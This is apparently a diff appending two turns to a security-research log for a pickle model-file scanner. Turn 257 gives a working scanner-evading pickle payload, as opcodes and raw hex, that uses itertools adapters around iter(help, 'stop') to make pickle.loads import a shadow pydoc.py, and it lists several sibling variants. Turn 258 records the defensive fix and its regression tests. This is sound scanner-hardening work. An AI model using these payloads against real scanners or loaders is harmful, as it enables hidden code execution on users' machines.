@@ -16354,3 +16354,248 @@ Validation:
 - `mypy`: `Success: no issues found in 447 source files`.
 - Full non-slow/non-integration validation:
   `3771 passed, 1022 skipped, 21 warnings in 42.32s`.
+
+## Turn 257 - Bypass via unmodeled `itertools` iterable adapters
+
+Found a new scanner-clean RCE-capable family around `itertools` adapters that
+consume or preserve a tracked two-argument `iter(callable, sentinel)` without
+the native stack model carrying the deferred callable effect.
+
+The strongest representative is eager materialization during construction:
+
+```python
+itertools.product(iter(builtins.help, "stop"))
+```
+
+`itertools.product(...)` pools each input iterable immediately. During
+`pickle.loads`, it drains `iter(help, "stop")`; a shadow `pydoc.py` at the
+front of `sys.path` executes when `_sitebuiltins._Helper.__call__` imports
+`pydoc`, returns one non-sentinel value, then returns the sentinel to stop the
+pooling loop. No later `list(...)`, `next(...)`, or other consumer is needed.
+
+Payload shape:
+
+```text
+PROTO 4
+STACK_GLOBAL builtins iter
+STACK_GLOBAL builtins help
+SHORT_BINUNICODE "stop"
+TUPLE2
+REDUCE              # iter(help, "stop")
+MEMOIZE
+POP
+STACK_GLOBAL itertools product
+BINGET 0
+TUPLE1
+REDUCE              # product(call_iterator), drains input immediately
+STOP
+```
+
+Raw payload:
+
+```text
+80048c086275696c74696e738c0469746572938c086275696c74696e738c0468656c70938c0473746f70865294308c0969746572746f6f6c738c0770726f6475637493680085522e
+```
+
+Scanner proof:
+
+```text
+payload_len 72
+scan clean findings 0 errors ()
+imports [
+  ('builtins', 'iter', 18),
+  ('builtins', 'help', 35),
+  ('itertools', 'product', 66),
+]
+invocations [
+  ('builtins', 'iter', 2, 43),
+  ('itertools', 'product', 1, 70),
+]
+```
+
+Runtime proof:
+
+```text
+runtime rc 0
+runtime_result_type product
+runtime_result_list [('owned-value',)]
+marker_exists True
+marker_text owned-by-itertools-product
+runtime stderr
+```
+
+Sibling probes stayed scanner-clean and executed the same shadow `pydoc.py`
+marker proof:
+
+```text
+itertools.cycle + next len 93 scan clean findings 0
+invocations [
+  ('builtins', 'iter', 2, 43),
+  ('itertools', 'cycle', 1, 68),
+  ('builtins', 'next', 1, 91),
+]
+runtime_result 'owned-value'
+
+itertools.zip_longest + next len 101 scan clean findings 0
+invocations [
+  ('builtins', 'iter', 2, 43),
+  ('itertools', 'zip_longest', 2, 76),
+  ('builtins', 'next', 1, 99),
+]
+runtime_result ('owned-value', None)
+
+itertools.compress + next len 101 scan clean findings 0
+invocations [
+  ('builtins', 'iter', 2, 43),
+  ('itertools', 'compress', 2, 76),
+  ('builtins', 'next', 1, 99),
+]
+runtime_result 'owned-value'
+
+itertools.pairwise + next len 96 scan clean findings 0
+invocations [
+  ('builtins', 'iter', 2, 43),
+  ('itertools', 'pairwise', 1, 71),
+  ('builtins', 'next', 1, 94),
+]
+runtime_result ('a', 'b')
+
+itertools.tee + operator.getitem + next len 120 scan clean findings 0
+invocations [
+  ('builtins', 'iter', 2, 43),
+  ('itertools', 'tee', 1, 66),
+  ('operator', 'getitem', 2, 95),
+  ('builtins', 'next', 1, 118),
+]
+runtime_result 'owned-value'
+```
+
+Why it bypasses:
+
+- Native policy intentionally does not mark clean `itertools` adapters like
+  `product`, `cycle`, `zip_longest`, `compress`, `pairwise`, or `tee` as
+  inherently dangerous.
+- The stack model tracks `iter(help, "stop")` as `StackValue::CallIterator`, but
+  only a small wrapper/consumer set currently preserves or drains that effect.
+- `itertools.product(...)` is not modeled as an eager iterable materializer, so
+  construction-time draining of the `CallIterator` is missed entirely.
+- `cycle`, `zip_longest`, `compress`, and `pairwise` return ordinary constructed
+  values instead of wrapper values that remember the embedded `CallIterator`, so
+  later `next(...)` calls do not emit the hidden zero-argument `help()`
+  invocation.
+- `tee` returns a tuple of lazy iterators, but the current reducer result model
+  does not preserve tuple-returning wrappers or tuple item extraction through
+  `operator.getitem`.
+- As before, the Python call graph already knows an invoked `builtins.help()`
+  reaches `_sitebuiltins._Helper.__call__ -> builtins.__import__`; the native
+  metadata simply never reports that hidden invocation.
+
+Likely source-level defense:
+
+- Add finite stack effects for `itertools` iterable adapters rather than
+  package-specific dangerous-symbol entries.
+- Treat eager materializers such as `itertools.product(call_iterator, ...)` as
+  construction-time consumers that emit a hidden zero-argument invocation for
+  any tracked `CallIterator` input.
+- Propagate `CallIterator` through lazy one-input adapters (`cycle`, `pairwise`)
+  and first-iterable adapters (`compress`, `zip_longest`) so existing `next` and
+  eager-consumer logic can fire.
+- For tuple-returning adapters such as `tee`, preserve a bounded tuple of lazy
+  wrapper values and let existing or new tuple item lookup modeling carry the
+  effect into `next(...)`.
+
+Performance note:
+
+- The representative payload is 72 bytes.
+- Warm scan median over 1000 runs was `0.000053s`, p95 `0.000057s`, and max
+  `0.000092s`.
+- A fix can remain reducer-local by checking reducer callable identity and
+  already-decoded argument stack values for a finite set of `itertools`
+  adapters.
+
+## Turn 258 - Defense for `itertools` adapter stack effects
+
+Blocked Turn 257 at the finite call-iterator source instead of adding
+package-level dangerous-symbol entries for clean `itertools` adapters.
+
+Implementation:
+
+- Modeled eager `itertools` poolers as construction-time consumers of tracked
+  `CallIterator` inputs. This covers `product`, `permutations`,
+  `combinations`, and `combinations_with_replacement`.
+- Extended lazy propagation through clean adapters that defer source iteration:
+  `cycle`, `zip_longest`, `compress`, `pairwise`, and `batched`, alongside the
+  existing `chain`, `islice`, and `chain.from_iterable` handling.
+- Added a tuple-like stack value for `itertools.tee(...)` results so bounded
+  item extraction through `operator.getitem(...)` can recover the tracked lazy
+  iterator before `next(...)` drains it.
+- Added reducer-local tuple item modeling for `operator.getitem` over tracked
+  tuples and tracked `tee` results.
+
+Regression coverage:
+
+- `itertools.product(iter(help, "stop"))` now fails at construction time with
+  the hidden zero-argument `builtins.help()` invocation.
+- `next(...)` over `cycle`, `zip_longest`, `compress`, and `pairwise` wrappers
+  now fails through the propagated `CallIterator`.
+- `next(operator.getitem(itertools.tee(iter(help, "stop")), 0))` now fails
+  through the tracked `tee` tuple item.
+- Runtime child interpreters still prove each payload reaches a shadow
+  `pydoc.py` during `pickle.loads`.
+
+Post-fix proof for the Turn 257 representative:
+
+```text
+payload_len 72
+scan malicious findings 1 errors ()
+imports [
+  ('builtins', 'iter', 18),
+  ('builtins', 'help', 35),
+  ('itertools', 'product', 66),
+]
+invocations [
+  ('builtins', 'iter', 2, 43),
+  ('itertools', 'product', 1, 70),
+  ('builtins', 'help', 0, 70),
+]
+finding critical DANGEROUS_CALL_GRAPH
+sink builtins.__import__
+call_path ('_sitebuiltins._Helper.__call__', 'builtins.__import__')
+```
+
+Runtime proof remains live:
+
+```text
+runtime rc 0
+runtime_result_type product
+runtime_result_list [('owned-value',)]
+marker_exists True
+marker_text owned-by-itertools-product
+runtime stderr
+```
+
+Performance note:
+
+- Warm scan median over 1000 post-fix runs was `0.000114s`, p95 `0.000119s`,
+  and max `0.000180s` for the 72-byte representative.
+- The added checks remain reducer-local and inspect only already-tracked stack
+  arguments.
+
+Validation:
+
+- Rust formatting:
+  `cargo fmt --manifest-path packages/modelaudit-picklescan/Cargo.toml`.
+- Rust unit tests: `78 passed`.
+- Rebuilt the local ignored extension with release `cargo build` plus macOS
+  dynamic-lookup linker flags, then copied it to
+  `packages/modelaudit-picklescan/src/modelaudit_picklescan/_rust.abi3.so` for
+  Python tests.
+- Focused new `itertools` adapter regressions: `6 passed in 0.45s`.
+- Focused import/call-graph regression file: `62 passed in 1.63s`.
+- Focused call-graph suite: `100 passed in 3.39s`.
+- Focused existing dangerous `itertools` oracle checks: `2 passed in 1.24s`.
+- `ruff format`: `392 files left unchanged`.
+- `ruff check --fix`: `All checks passed!`.
+- `mypy`: `Success: no issues found in 447 source files`.
+- Full non-slow/non-integration validation:
+  `3777 passed, 1022 skipped, 21 warnings in 38.99s`.
